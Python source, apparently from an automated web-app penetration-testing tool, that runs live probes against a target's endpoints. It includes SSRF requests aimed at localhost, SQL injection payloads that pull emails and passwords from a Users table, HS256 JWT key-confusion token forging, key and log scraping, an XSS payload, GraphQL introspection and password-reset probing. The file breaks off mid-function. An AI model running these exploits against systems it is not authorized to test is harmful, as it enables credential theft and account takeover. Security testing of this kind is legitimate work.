"""Deterministic coverage probes (Task stage coverage_probe).

HTTP follow-ups for Feedback-required coverage ids. Writes candidates +
coverage_ledger entries — not a Campaign state machine.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
import time
from typing import Any
from urllib.parse import urljoin, urlparse

import httpx

from node5.coverage import record_coverage, required_coverage, coverage_outcome
from node5.identity import normalize_path
from node5.state import Candidate, PenState, Surface

def _cov_attempt(
    state: PenState,
    cov_id: str,
    *,
    action: str = "",
    status: str | None = None,
    evidence: str = "",
) -> None:
    """Map probe result to coverage_ledger (Feedback reads outcomes)."""
    outcome = "attempted"
    if status == "booked":
        outcome = "closed"
    elif status == "deadend":
        outcome = "failed"
    elif status == "skipped":
        outcome = "blocked"
    detail = action or evidence or status or ""
    if evidence and evidence not in detail:
        detail = f"{detail}; {evidence}"[:500]
    record_coverage(state, cov_id, outcome=outcome, detail=detail)  # type: ignore[arg-type]



# Soft caps (step1: higher budget + rotation)
_MAX_HTTP_PER_CAMPAIGN = 12
_MAX_TOTAL_HTTP = 72
_MAX_COVERAGE_IDS_PER_PASS = 8
_SSRF_MAX_HTTP = 10


def _base(target: str) -> str:
    t = (target or "").rstrip("/")
    if not t.startswith("http"):
        t = "http://" + t
    return t


def _host_ok(url: str, base: str) -> bool:
    try:
        u, b = urlparse(url), urlparse(base)
        return bool(u.hostname) and u.hostname == b.hostname
    except Exception:
        return False


def _cookies_header(state: PenState) -> dict[str, str]:
    """Build Cookie + optional Authorization from state (prefer token cookie)."""
    headers: dict[str, str] = {}
    bag = dict(state.cookies or {})
    # Prefer named actor jar if default empty
    if not bag and state.actor_cookies:
        for _aid, abag in state.actor_cookies.items():
            if abag:
                bag = dict(abag)
                break
    if bag:
        headers["Cookie"] = "; ".join(f"{k}={v}" for k, v in bag.items())
        for key in ("token", "jwt", "access_token"):
            if key in bag and bag[key]:
                val = str(bag[key])
                headers["Authorization"] = (
                    val if val.lower().startswith("bearer") else f"Bearer {val}"
                )
                # Ensure token also present as cookie name used by many SPA APIs
                if "token=" not in headers["Cookie"] and key == "token":
                    headers["Cookie"] = (headers["Cookie"] + f"; token={val}").strip("; ")
                break
    return headers


def _token_from_state(state: PenState) -> str:
    for bag in (state.cookies, *(state.actor_cookies or {}).values()):
        if not bag:
            continue
        for key in ("token", "jwt", "access_token"):
            if bag.get(key):
                return str(bag[key])
    return ""


def _ensure_session(
    state: PenState,
    client: httpx.Client,
    base: str,
    budget: list[int],
) -> bool:
    """Register+login when no token cookie — needed for auth-gated URL sinks."""
    if _token_from_state(state):
        # refresh cookie header shape
        tok = _token_from_state(state)
        state.cookies.setdefault("token", tok)
        return True
    if budget[0] >= _MAX_HTTP_PER_CAMPAIGN - 2:
        return False
    # Generic open-register surfaces
    email = f"n5camp{int(time.time()) % 10_000_000}@lab.invalid"
    password = "N5Camp!234"
    reg_paths = [
        s.path
        for s in state.surfaces
        if "register" in (s.path or "").lower() or s.path.rstrip("/").endswith("/Users")
    ]
    if not reg_paths:
        reg_paths = ["/api/Users", "/rest/user/register"]
    login_paths = [
        s.path
        for s in state.surfaces
        if "login" in (s.path or "").lower()
    ] or ["/rest/user/login"]

    for rpath in reg_paths[:2]:
        url = urljoin(base + "/", rpath.lstrip("/").split("?")[0])
        if not _host_ok(url, base):
            continue
        try:
            client.post(
                url,
                content=json.dumps(
                    {
                        "email": email,
                        "password": password,
                        "passwordRepeat": password,
                        "securityQuestion": {"id": 1, "question": "q"},
                        "securityAnswer": "a",
                    }
                ).encode(),
                headers={"Content-Type": "application/json"},
            )
            budget[0] += 1
        except Exception:
            continue
        break

    for lpath in login_paths[:2]:
        url = urljoin(base + "/", lpath.lstrip("/").split("?")[0])
        if not _host_ok(url, base):
            continue
        try:
            resp = client.post(
                url,
                content=json.dumps({"email": email, "password": password}).encode(),
                headers={"Content-Type": "application/json"},
            )
            budget[0] += 1
        except Exception:
            continue
        try:
            data = resp.json()
        except Exception:
            data = {}
        tok = ""
        if isinstance(data, dict):
            auth = data.get("authentication") or {}
            if isinstance(auth, dict):
                tok = str(auth.get("token") or "")
            tok = tok or str(data.get("token") or "")
        if not tok and resp.headers.get("set-cookie"):
            m = re.search(r"token=([^;]+)", resp.headers.get("set-cookie") or "")
            if m:
                tok = m.group(1)
        if tok:
            state.cookies["token"] = tok
            state.note(f"coverage_probes: session seeded via login ({lpath})")
            return True
    return bool(_token_from_state(state))


def _add_candidate(
    state: PenState,
    *,
    title: str,
    location: str,
    proof: str,
    severity: str = "high",
    impact: str,
) -> None:
    state.candidates.append(
        Candidate(
            title=title,
            location=location,
            severity=severity,
            proof_excerpt=proof[:1200],
            causality="Deterministic campaign probe caused the condition with live HTTP",
            reproducibility=f"Replay probe against {location} with same payload within session",
            impact=impact,
            stage="coverage_probe",
            ready_to_book=True,
            worker_id="coverage_probe",
        )
    )


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _jwt_hs256(payload: dict[str, Any], secret: bytes) -> str:
    header = {"alg": "HS256", "typ": "JWT"}
    h = _b64url(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url(json.dumps(payload, separators=(",", ":")).encode())
    sig = hmac.new(secret, f"{h}.{p}".encode(), hashlib.sha256).digest()
    return f"{h}.{p}.{_b64url(sig)}"


def _read_profile_image(state: PenState, client: httpx.Client, base: str, budget: list[int]) -> str:
    """Best-effort current profileImage from whoami or Users list."""
    headers = _cookies_header(state)
    for path in ("/rest/user/whoami", "/api/Users/whoami"):
        if budget[0] >= _MAX_HTTP_PER_CAMPAIGN:
            break
        url = urljoin(base + "/", path.lstrip("/"))
        try:
            resp = client.get(url, headers=headers)
            budget[0] += 1
            data = resp.json()
            user = data.get("user") if isinstance(data, dict) else None
            if isinstance(user, dict) and user.get("profileImage"):
                return str(user.get("profileImage"))
            if isinstance(data, dict) and data.get("profileImage"):
                return str(data.get("profileImage"))
        except Exception:
            continue
    # Users collection (often unauth or same token)
    try:
        resp = client.get(urljoin(base + "/", "api/Users"), headers=headers)
        budget[0] += 1
        data = resp.json()
        rows = data.get("data") if isinstance(data, dict) else data
        if isinstance(rows, list) and rows:
            # last-created often ours; prefer matching email from notes if any
            for u in reversed(rows[-20:]):
                if isinstance(u, dict) and u.get("profileImage"):
                    # prefer non-default if multiple
                    pi = str(u.get("profileImage"))
                    if "default" not in pi.lower():
                        return pi
            u0 = rows[-1]
            if isinstance(u0, dict):
                return str(u0.get("profileImage") or "")
    except Exception:
        pass
    return ""


def _probe_ssrf(
    state: PenState,
    client: httpx.Client,
    base: str,
    camp_id: str,
    budget: list[int],
) -> bool:
    """Auth + urlencoded URL-fetch sinks; prove via profileImage / upload / body differential.

    Many SPA apps parse urlencoded/multipart on upload routes and keep session in cookies
    (not Authorization alone). JSON may be registered after the route and never reach body.
    """
    if not _ensure_session(state, client, base, budget):
        _cov_attempt(
            state,
            camp_id,
            action="ssrf: auth_empty (register/login failed)",
            status="deadend",
            evidence="auth-gated URL sink requires cookie/token session",
        )
        return False
    # Verify session actually binds (whoami non-empty)
    pi0 = _read_profile_image(state, client, base, budget)
    who = ""
    try:
        wr = client.get(
            urljoin(base + "/", "rest/user/whoami"), headers=_cookies_header(state)
        )
        budget[0] += 1
        who = (wr.text or "")[:200]
    except Exception:
        pass
    if '"id"' not in who and not pi0:
        _cov_attempt(
            state,
            camp_id,
            action="ssrf: auth_empty whoami empty after login",
            status="deadend",
            evidence=who or "no whoami",
        )
        return False

    sinks = [
        s
        for s in state.surfaces
        if any(
            x in f"{s.path} {s.note}".lower()
            for x in ("image/url", "profile/image", "webhook", "callback", "avatar", "fetch")
        )
    ]
    if not sinks:
        sinks = [Surface(path="/profile/image/url", method="POST", note="fallback sink")]

    parsed = urlparse(base)
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    # High-signal image URLs first (few combos — avoid budget thrash)
    probe_urls = [
        f"http://localhost:{port}/assets/public/images/carousel/1.jpg",
        f"http://127.0.0.1:{port}/assets/public/images/carousel/1.jpg",
        f"{base}/assets/public/images/carousel/1.jpg",
        f"http://localhost:{port}/assets/public/images/uploads/default.svg",
        f"http://127.0.0.1:9/",  # closed port → may set profileImage=url
    ]
    param_names = ("imageUrl", "url")
    content_modes = ("urlencoded", "multipart_field")

    baseline_pi = pi0 or _read_profile_image(state, client, base, budget)
    tried: list[str] = []
    ssrf_budget_start = budget[0]

    for sink in sinks[:2]:
        path = sink.path if sink.path.startswith("/") else "/" + sink.path
        url = urljoin(base + "/", path.lstrip("/"))
        if not _host_ok(url, base):
            continue
        for mode in content_modes:
            for pname in param_names:
                for purl in probe_urls:
                    if budget[0] - ssrf_budget_start >= _SSRF_MAX_HTTP:
                        _cov_attempt(
                            state,
                            camp_id,
                            action="ssrf budget exhausted",
                            status="deadend",
                            evidence="; ".join(tried[-8:]) or "ssrf_cap",
                        )
                        return False
                    headers = {**_cookies_header(state), "Accept": "*/*"}
                    try:
                        if mode == "urlencoded":
                            headers["Content-Type"] = "application/x-www-form-urlencoded"
                            body = f"{pname}={purl}".encode()
                            resp = client.post(url, content=body, headers=headers)
                        else:
                            boundary = "----n5campboundary"
                            headers["Content-Type"] = (
                                f"multipart/form-data; boundary={boundary}"
                            )
                            body = (
                                f"--{boundary}\r\n"
                                f'Content-Disposition: form-data; name="{pname}"\r\n\r\n'
                                f"{purl}\r\n"
                                f"--{boundary}--\r\n"
                            ).encode()
                            resp = client.post(url, content=body, headers=headers)
                        budget[0] += 1
                    except Exception as e:
                        tried.append(f"{mode}/{pname} err={e}")
                        continue

                    tried.append(f"{mode}/{pname}→{resp.status_code}")
                    body = resp.text or ""
                    bl = body.lower()
                    ctype = (resp.headers.get("content-type") or "").lower()
                    if "blocked illegal activity" in bl:
                        tried.append("auth_or_ip_block")
                        continue

                    # Re-read profile image / user record
                    new_pi = _read_profile_image(state, client, base, budget)
                    signals: list[str] = []
                    if new_pi and baseline_pi and new_pi != baseline_pi:
                        signals.append("profileImage_changed")
                    # Attacker URL stored as profileImage (fetch failed but server handled URL)
                    if new_pi and purl.rstrip("/") in new_pi:
                        signals.append("profileImage_set_to_attacker_url")
                    if new_pi and new_pi.startswith("http") and new_pi != baseline_pi:
                        signals.append("profileImage_set_to_http_url")
                    # Non-default upload path after successful image fetch
                    if (
                        new_pi
                        and "uploads/" in new_pi
                        and "default" not in new_pi.lower()
                        and new_pi != baseline_pi
                    ):
                        signals.append("profileImage_nondefault_upload")

                    m = re.search(r"/uploads/(\d+)\.([a-zA-Z0-9]+)", new_pi or "")
                    if m and new_pi != baseline_pi:
                        up = f"/assets/public/images/uploads/{m.group(1)}.{m.group(2)}"
                        try:
                            ur = client.get(urljoin(base + "/", up.lstrip("/")), headers=headers)
                            budget[0] += 1
                            uct = (ur.headers.get("content-type") or "").lower()
                            if ur.status_code == 200 and "image/" in uct and "text/html" not in uct:
                                if len(ur.content or b"") > 200:
                                    signals.append(f"upload_file_hit:{up}")
                        except Exception:
                            pass

                    if any(
                        x in bl
                        for x in (
                            "index of",
                            "directory listing",
                            "package.json",
                        )
                    ) and resp.status_code == 200:
                        signals.append("response_internal_content")
                    # Authenticated sink that actually attempted fetch (error path)
                    if "blocked illegal activity" in bl:
                        # missing session — not a successful SSRF
                        pass
                    elif any(
                        x in bl
                        for x in (
                            "econnrefused",
                            "enotfound",
                            "getaddrinfo",
                            "fetch failed",
                            "non-ok status",
                            "empty body",
                        )
                    ):
                        signals.append("server_fetch_error")

                    strong = any(
                        s
                        in (
                            "profileImage_changed",
                            "profileImage_set_to_attacker_url",
                            "profileImage_set_to_http_url",
                            "profileImage_nondefault_upload",
                        )
                        or s.startswith("upload_file")
                        for s in signals
                    )
                    if strong or (
                        "response_internal_content" in signals
                        and resp.status_code == 200
                    ):
                        proof = (
                            f"POST {path} ({mode}) {pname}={purl} → HTTP {resp.status_code} "
                            f"ctype={ctype[:40]}; baseline_profileImage={baseline_pi!r}; "
                            f"after={new_pi!r}; signals={signals}; "
                            f"server-side URL-fetch sink accepted attacker URL "
                            f"(Cookie session). body_excerpt={body[:180]!r}"
                        )
                        _add_candidate(
                            state,
                            title="SSRF via URL-fetch parameter (server-side request)",
                            location=path,
                            proof=proof,
                            impact=(
                                "Authenticated attacker can make the server fetch arbitrary "
                                "in-scope URLs and persist result as profile/media state"
                            ),
                        )
                        _cov_attempt(state,
                            camp_id,
                            action=f"ssrf hit {mode} {path}",
                            evidence=proof[:400],
                            status="booked",
                        )
                        return True

    _cov_attempt(state,
        camp_id,
        action="ssrf probes exhausted without server-side proof",
        status="deadend",
        evidence="; ".join(tried[-10:]) or f"sinks={[s.path for s in sinks[:3]]}",
    )
    return False


def _probe_deep_sqli(
    state: PenState,
    client: httpx.Client,
    base: str,
    camp_id: str,
    budget: list[int],
    *,
    sensitive: bool = False,
) -> bool:
    """Boolean/UNION-style probes on search q= — generic ladder, not fixed dumps."""
    search_paths = [
        s.path
        for s in state.surfaces
        if any(x in f"{s.path} {s.note}".lower() for x in ("search", "query", "?q="))
    ]
    if not search_paths:
        search_paths = ["/rest/products/search"]

    # payloads: error probe, boolean, column count, limited UNION
    probes: list[tuple[str, str]] = [
        ("error", "'"),
        ("boolean_true", "test' OR '1'='1"),
        ("boolean_false", "test' AND '1'='2"),
        ("union_null_1", "test' UNION SELECT null--"),
        ("union_null_2", "test' UNION SELECT null,null--"),
        ("union_null_3", "test' UNION SELECT null,null,null--"),
        ("union_null_4", "' UNION SELECT null,null,null,null--"),
        (
            "union_schema",
            "' UNION SELECT sql,null,null,null FROM sqlite_master--",
        ),
        (
            "union_schema2",
            "qwert')) UNION SELECT sql,null,'x' FROM sqlite_master--",
        ),
    ]
    if sensitive:
        probes.extend(
            [
                (
                    "union_users_generic",
                    "' UNION SELECT email,password,null,null FROM Users--",
                ),
                (
                    "union_users_generic2",
                    "')) UNION SELECT email,password,'x' FROM Users--",
                ),
            ]
        )

    for path in search_paths[:2]:
        npath = path if path.startswith("/") else "/" + path
        # strip query for base
        npath = npath.split("?", 1)[0]
        url = urljoin(base + "/", npath.lstrip("/"))
        if not _host_ok(url, base):
            continue

        baseline = ""
        baseline_len = 0
        try:
            r0 = client.get(url, params={"q": "zzzznotfound123"}, headers=_cookies_header(state))
            budget[0] += 1
            baseline = (r0.text or "")[:500]
            baseline_len = len(r0.text or "")
        except Exception:
            continue

        data_hits: list[str] = []
        for name, payload in probes:
            if budget[0] >= _MAX_HTTP_PER_CAMPAIGN:
                break
            try:
                resp = client.get(
                    url,
                    params={"q": payload},
                    headers=_cookies_header(state),
                )
                budget[0] += 1
            except Exception:
                continue
            body = resp.text or ""
            bl = body.lower()
            # data-effect markers
            if any(
                m in bl
                for m in (
                    "sqlite_master",
                    "create table",
                    "sql\":",
                    "users",
                    "email",
                    "password",
                    "totp",
                )
            ) and body[:200] != baseline[:200]:
                data_hits.append(f"{name}:HTTP{resp.status_code}:{body[:200]}")
            elif abs(len(body) - baseline_len) > 80 and resp.status_code == 200:
                # length differential may indicate boolean — weak
                if "boolean" in name:
                    data_hits.append(f"{name}:len_diff={len(body)-baseline_len}")

        if data_hits:
            strong = [h for h in data_hits if any(
                x in h.lower()
                for x in ("create table", "sqlite", "password", "email", "users", "totp")
            )]
            if strong or (sensitive and data_hits):
                proof = (
                    f"GET {npath}?q=… data-effect markers: {strong or data_hits[:3]}; "
                    f"baseline_len={baseline_len}"
                )
                title = (
                    "SQL injection data extraction on search"
                    if strong
                    else "SQL injection boolean/data differential on search"
                )
                _add_candidate(
                    state,
                    title=title,
                    location=npath,
                    proof=proof,
                    impact="Query injection yields schema or user data from backend DB",
                    severity="critical" if strong else "high",
                )
                _cov_attempt(state,
                    camp_id,
                    action=f"deep_sqli hit on {npath}",
                    evidence=proof[:400],
                    status="booked",
                )
                return True
            # weak length-only: keep in_progress
            _cov_attempt(state,
                camp_id,
                action=f"weak sqli differentials on {npath}",
                evidence=";".join(data_hits[:3]),
                status="in_progress",
            )

    _cov_attempt(state,
        camp_id,
        action="deep_sqli probes exhausted without strong data effect",
        status="deadend",
        evidence=f"paths={search_paths[:2]}",
    )
    return False


def _probe_jwt_keys(
    state: PenState,
    client: httpx.Client,
    base: str,
    camp_id: str,
    budget: list[int],
) -> bool:
    """Download key material; try limited HS256-with-pubkey confusion on whoami."""
    key_paths = [
        "/encryptionkeys",
        "/encryptionkeys/",
        "/encryptionkeys/jwt.pub",
        "/encryptionkeys/public-key",
        "/jwt.pub",
    ]
    # also from surfaces
    for s in state.surfaces:
        p = (s.path or "").strip()
        if any(x in p.lower() for x in ("encryption", "jwt.pub", ".pem")) and p not in key_paths:
            key_paths.append(p)

    key_material: bytes | None = None
    key_url = ""
    listing = ""
    for path in key_paths:
        if budget[0] >= _MAX_HTTP_PER_CAMPAIGN:
            break
        url = urljoin(base + "/", path.lstrip("/"))
        if not _host_ok(url, base):
            continue
        try:
            resp = client.get(url, headers=_cookies_header(state))
            budget[0] += 1
        except Exception:
            continue
        body = resp.text or ""
        if resp.status_code != 200:
            continue
        if "begin " in body.lower() or "-----" in body or ".pub" in body.lower():
            listing = body[:800]
            # if directory listing, try to fetch .pub files
            for m in re.findall(r'href=["\']([^"\']+\.pub)["\']', body, flags=re.I):
                sub = urljoin(url.rstrip("/") + "/", m)
                if not _host_ok(sub, base):
                    continue
                try:
                    r2 = client.get(sub, headers=_cookies_header(state))
                    budget[0] += 1
                    if r2.status_code == 200 and r2.content:
                        key_material = r2.content
                        key_url = sub
                        break
                except Exception:
                    continue
            if key_material is None and ("begin " in body.lower() or "-----" in body):
                key_material = body.encode()
                key_url = url
        if key_material:
            break

    if key_material is None and listing:
        _cov_attempt(state,
            camp_id,
            action="key listing seen but no downloadable key body",
            status="in_progress",
            evidence=listing[:300],
        )
        # Still book sensitive exposure if listing looks secret-grade
        if "jwt" in listing.lower() or ".pub" in listing.lower():
            _add_candidate(
                state,
                title="Exposed encryption/key directory listing",
                location="/encryptionkeys",
                proof=f"GET listing HTTP 200 excerpt={listing[:400]!r}",
                impact="Key material directory is publicly listable",
                severity="medium",
            )
            # don't mark jwt campaign booked on listing alone
        return False

    if key_material is None:
        _cov_attempt(state,
            camp_id,
            action="no key material downloaded",
            status="deadend",
        )
        return False

    # whoami endpoints
    whoamis = [
        "/rest/user/whoami",
        "/api/Users/whoami",
        "/api/users/me",
        "/whoami",
    ]
    payload = {
        "data": {"email": "probe@example.invalid", "id": 1},
        "iat": int(time.time()),
        "exp": int(time.time()) + 3600,
    }
    # Try HMAC with raw pubkey bytes and with PEM text stripped
    secrets = [key_material, key_material.strip()]
    # also hash of key as some frameworks misuse
    secrets.append(hashlib.sha256(key_material).digest())

    for secret in secrets:
        token = _jwt_hs256(payload, secret if isinstance(secret, bytes) else secret)
        for wpath in whoamis:
            if budget[0] >= _MAX_HTTP_PER_CAMPAIGN:
                break
            url = urljoin(base + "/", wpath.lstrip("/"))
            if not _host_ok(url, base):
                continue
            headers = {
                **_cookies_header(state),
                "Authorization": f"Bearer {token}",
            }
            # also cookie style
            try:
                resp = client.get(url, headers=headers)
                budget[0] += 1
            except Exception:
                continue
            body = (resp.text or "").lower()
            if resp.status_code == 200 and any(
                x in body for x in ("email", "user", "id", "token", "admin", "role")
            ):
                # reject pure login-required error pages
                if "invalid" in body and "token" in body and "email" not in body:
                    continue
                proof = (
                    f"HS256 JWT signed with key material from {key_url or 'key path'} "
                    f"accepted on GET {wpath} HTTP {resp.status_code} body={resp.text[:250]!r}"
                )
                _add_candidate(
                    state,
                    title="JWT algorithm confusion / key misuse accepted by server",
                    location=wpath,
                    proof=proof,
                    impact="Attacker can forge authenticated sessions using exposed key material",
                    severity="critical",
                )
                _cov_attempt(state,
                    camp_id,
                    action=f"jwt confusion accepted on {wpath}",
                    evidence=proof[:400],
                    status="booked",
                )
                return True

    _cov_attempt(state,
        camp_id,
        action="jwt key downloaded; signed confusion not accepted",
        status="deadend",
        evidence=f"key_url={key_url} bytes={len(key_material)}",
    )
    return False


def _probe_sensitive_exposure(
    state: PenState,
    client: httpx.Client,
    base: str,
    camp_id: str,
    budget: list[int],
) -> bool:
    paths = []
    for s in state.surfaces:
        blob = f"{s.path} {s.note}".lower()
        if any(x in blob for x in ("logs", "encryptionkey", "metrics", "listing")):
            paths.append(s.path)
    for p in ("/support/logs", "/support/logs/", "/encryptionkeys", "/metrics"):
        if p not in paths:
            paths.append(p)

    hits: list[str] = []
    for path in paths[:8]:
        if budget[0] >= _MAX_HTTP_PER_CAMPAIGN:
            break
        url = urljoin(base + "/", path.lstrip("/"))
        if not _host_ok(url, base):
            continue
        try:
            resp = client.get(url, headers=_cookies_header(state))
            budget[0] += 1
        except Exception:
            continue
        if resp.status_code != 200:
            continue
        body = resp.text or ""
        bl = body.lower()
        if any(
            x in bl
            for x in (
                "begin rsa",
                "begin public",
                "private key",
                "password",
                "api_key",
                "secret",
                "index of",
                "jwt.pub",
            )
        ):
            hits.append(f"{path}:HTTP{resp.status_code}:{body[:180]}")
            # follow hrefs for small files
            for m in re.findall(r'href=["\']([^"\']+)["\']', body)[:5]:
                if m.startswith("?") or m.startswith("#"):
                    continue
                sub = urljoin(url.rstrip("/") + "/", m)
                if not _host_ok(sub, base):
                    continue
                if budget[0] >= _MAX_HTTP_PER_CAMPAIGN:
                    break
                try:
                    r2 = client.get(sub, headers=_cookies_header(state))
                    budget[0] += 1
                    b2 = (r2.text or "").lower()
                    if r2.status_code == 200 and any(
                        x in b2 for x in ("begin ", "password", "secret", "token=", "key=")
                    ):
                        hits.append(f"{sub}:HTTP{r2.status_code}:{r2.text[:150]}")
                except Exception:
                    continue

    if hits:
        strong = [h for h in hits if any(
            x in h.lower() for x in ("begin ", "password", "secret", "private", "token=")
        )]
        if strong:
            proof = "; ".join(strong[:3])
            _add_candidate(
                state,
                title="Sensitive technical exposure (keys/logs/secrets)",
                location=normalize_path(strong[0].split(":")[0], state.target)
                or strong[0].split(":")[0],
                proof=proof,
                impact="Sensitive key or secret material is readable without auth",
                severity="high",
            )
            _cov_attempt(state,
                camp_id,
                action="sensitive exposure booked",
                evidence=proof[:400],
                status="booked",
            )
            return True
        _cov_attempt(state,
            camp_id,
            action="listings found without secret-grade content",
            status="deadend",
            evidence=";".join(hits[:3]),
        )
        return False

    _cov_attempt(state,
        camp_id,
        action="no sensitive exposure hits",
        status="deadend",
    )
    return False


def _probe_xss_self(
    state: PenState,
    client: httpx.Client,
    base: str,
    camp_id: str,
    budget: list[int],
) -> bool:
    marker = f"n5x{int(time.time()) % 100000}"
    payload = f'<img src=x onerror=console.log("{marker}")>'
    paths = [
        s.path
        for s in state.surfaces
        if any(x in f"{s.path} {s.note}".lower() for x in ("review", "comment", "feedback", "guestbook"))
    ]
    if not paths:
        _cov_attempt(state, camp_id, action="no UGC path for XSS", status="deadend"
        )
        return False

    for path in paths[:3]:
        npath = path.split("?", 1)[0]
        url = urljoin(base + "/", npath.lstrip("/"))
        if not _host_ok(url, base):
            continue
        for method, body in (
            ("POST", {"message": payload, "comment": payload, "captcha": "0"}),
            ("PUT", {"message": payload, "comment": payload}),
        ):
            if budget[0] >= _MAX_HTTP_PER_CAMPAIGN:
                break
            try:
                resp = client.request(
                    method,
                    url,
                    content=json.dumps(body).encode(),
                    headers={
                        **_cookies_header(state),
                        "Content-Type": "application/json",
                    },
                )
                budget[0] += 1
            except Exception:
                continue
            # re-fetch
            try:
                r2 = client.get(url, headers=_cookies_header(state))
                budget[0] += 1
            except Exception:
                continue
            if marker in (r2.text or "") or marker in (resp.text or ""):
                proof = (
                    f"{method} {npath} self-injected marker={marker} "
                    f"reflected in HTTP {r2.status_code} body"
                )
                _add_candidate(
                    state,
                    title="Stored/reflected XSS via self-injected payload",
                    location=npath,
                    proof=proof,
                    impact="Attacker-controlled script marker stored or reflected",
                    severity="high",
                )
                _cov_attempt(state,
                    camp_id,
                    action=f"xss self-inject on {npath}",
                    evidence=proof[:400],
                    status="booked",
                )
                return True

    _cov_attempt(state,
        camp_id,
        action="xss self-inject did not reflect marker",
        status="deadend",
    )
    return False


_INTROSPECTION = {
    "query": (
        "query N5Introspection { __schema { queryType { name } mutationType { name } "
        "types { name kind } } }"
    )
}


def _probe_graphql(
    state: PenState,
    client: httpx.Client,
    base: str,
    camp_id: str,
    budget: list[int],
) -> bool:
    paths = [
        s.path
        for s in state.surfaces
        if "graphql" in f"{s.path} {s.note}".lower()
    ] or ["/graphql", "/api/graphql"]
    headers = {**_cookies_header(state), "Content-Type": "application/json"}
    for path in paths[:3]:
        npath = path.split("?", 1)[0]
        url = urljoin(base + "/", npath.lstrip("/"))
        if not _host_ok(url, base):
            continue
        if budget[0] >= _MAX_HTTP_PER_CAMPAIGN:
            break
        try:
            resp = client.post(
                url,
                content=json.dumps(_INTROSPECTION).encode(),
                headers=headers,
            )
            budget[0] += 1
        except Exception as e:
            _cov_attempt(state, camp_id, action=f"graphql error {e}", status="in_progress"
            )
            continue
        body = resp.text or ""
        bl = body.lower()
        if resp.status_code == 200 and (
            "__schema" in bl
            or "querytype" in bl
            or '"types"' in bl
            or "mutationtype" in bl
        ):
            sensitive = any(
                x in bl
                for x in (
                    "user",
                    "password",
                    "admin",
                    "secret",
                    "token",
                    "card",
                    "basket",
                )
            )
            sev = "high" if sensitive else "medium"
            proof = (
                f"POST {npath} introspection HTTP {resp.status_code}; "
                f"schema exposed types/queryType. excerpt={body[:400]!r}"
            )
            _add_candidate(
                state,
                title="GraphQL introspection enabled (schema disclosure)",
                location=npath,
                proof=proof,
                impact="Attackers can map the full GraphQL schema including sensitive types",
                severity=sev,
            )
            # optional unauth data probe using a field name from response
            fields = re.findall(r'"name"\s*:\s*"([A-Za-z][A-Za-z0-9_]{2,40})"', body)
            for fname in fields[:8]:
                if fname.startswith("__") or fname in ("Query", "Mutation", "String", "Int", "Boolean", "ID"):
                    continue
                if budget[0] >= _MAX_HTTP_PER_CAMPAIGN:
                    break
                # only try plural-ish collection names
                if not re.search(r"(users?|products?|orders?|baskets?|accounts?)$", fname, re.I):
                    continue
                q = {"query": f"query {{ {fname} {{ id }} }}"}
                try:
                    r2 = client.post(
                        url, content=json.dumps(q).encode(), headers=headers
                    )
                    budget[0] += 1
                except Exception:
                    continue
                t2 = (r2.text or "").lower()
                if r2.status_code == 200 and '"data"' in t2 and "error" not in t2[:80]:
                    if any(x in t2 for x in ("email", "password", "role", "token", "user")):
                        _add_candidate(
                            state,
                            title=f"GraphQL unauthenticated data access via {fname}",
                            location=npath,
                            proof=(
                                f"POST {npath} query {{ {fname} {{ id }} }} HTTP {r2.status_code} "
                                f"body={r2.text[:300]!r}"
                            ),
                            impact="GraphQL returns sensitive objects without proper authz",
                            severity="high",
                        )
                        _cov_attempt(state,
                            camp_id,
                            action=f"graphql data hit {fname}",
                            evidence=r2.text[:300],
                            status="booked",
                        )
                        return True
            _cov_attempt(state,
                camp_id,
                action="graphql introspection booked",
                evidence=proof[:400],
                status="booked",
            )
            return True
        if resp.status_code in (401, 403):
            _cov_attempt(state,
                camp_id,
                action=f"graphql introspection HTTP {resp.status_code}",
                status="in_progress",
                evidence=body[:200],
            )
    _cov_attempt(state,
        camp_id,
        action="graphql probes exhausted",
        status="deadend",
        evidence=f"paths={paths[:3]}",
    )
    return False


def _probe_identity_reset(
    state: PenState,
    client: httpx.Client,
    base: str,
    camp_id: str,
    budget: list[int],
) -> bool:
    paths = [
        s.path
        for s in state.surfaces
        if any(
            x in f"{s.path} {s.note}".lower()
            for x in (
                "reset-password",
                "reset_password",
                "forgot",
                "security-question",
                "security_question",
            )
        )
    ] or [
        "/rest/user/security-question",
        "/rest/user/reset-password",
    ]
    hits: list[str] = []
    for path in paths[:4]:
        npath = path.split("?", 1)[0]
        url = urljoin(base + "/", npath.lstrip("/"))
        if not _host_ok(url, base):
            continue
        question_body = ""
        for method, body in (
            ("GET", None),
            ("GET", None),  # email query variants below
            ("POST", b'{"email":"n5probe@lab.invalid"}'),
            (
                "POST",
                b'{"email":"n5probe@lab.invalid","answer":"wrong-answer-n5","new":"x","newPassword":"N5New!234","newPasswordRepeat":"N5New!234"}',
            ),
            (
                "POST",
                b'{"email":"n5probe@lab.invalid","answer":"","newPassword":"N5New!234"}',
            ),
        ):
            if budget[0] >= _MAX_HTTP_PER_CAMPAIGN:
                break
            try:
                if method == "GET":
                    # try with email query for security-question style APIs
                    if "security" in npath.lower() and budget[0] > 0:
                        resp = client.get(
                            url,
                            params={"email": "n5probe@lab.invalid"},
                            headers=_cookies_header(state),
                        )
                    else:
                        resp = client.get(url, headers=_cookies_header(state))
                else:
                    resp = client.post(
                        url,
                        content=body,
                        headers={
                            **_cookies_header(state),
                            "Content-Type": "application/json",
                        },
                    )
                budget[0] += 1
            except Exception:
                continue
            text = resp.text or ""
            tl = text.lower()
            if method == "GET" and resp.status_code == 200 and "question" in tl:
                question_body = text[:300]
            # security question enumeration / detailed questions without auth
            if resp.status_code == 200 and any(
                x in tl
                for x in (
                    "question",
                    "security",
                    "mother",
                    "pet",
                    "school",
                    "answer",
                )
            ):
                hits.append(f"{method} {npath} HTTP {resp.status_code}: {text[:160]}")
            # wrong-answer differential: 401/403/error vs 200 success
            if body and b"wrong-answer" in (body or b""):
                hits.append(
                    f"wrong_answer_probe {npath} → HTTP {resp.status_code} body={text[:80]!r}"
                )
            if resp.status_code in (200, 201) and any(
                x in tl for x in ("password updated", "reset successful", "token")
            ):
                hits.append(f"reset_accept {method} {npath}: {text[:120]}")
        if question_body and any("wrong_answer" in h for h in hits):
            hits.append(f"question_then_wrong_answer_flow question={question_body[:80]!r}")

    if hits:
        strong = any("reset_accept" in h for h in hits)
        proof = "; ".join(hits[:4])
        _add_candidate(
            state,
            title=(
                "Password reset accepts unauthenticated reset flow"
                if strong
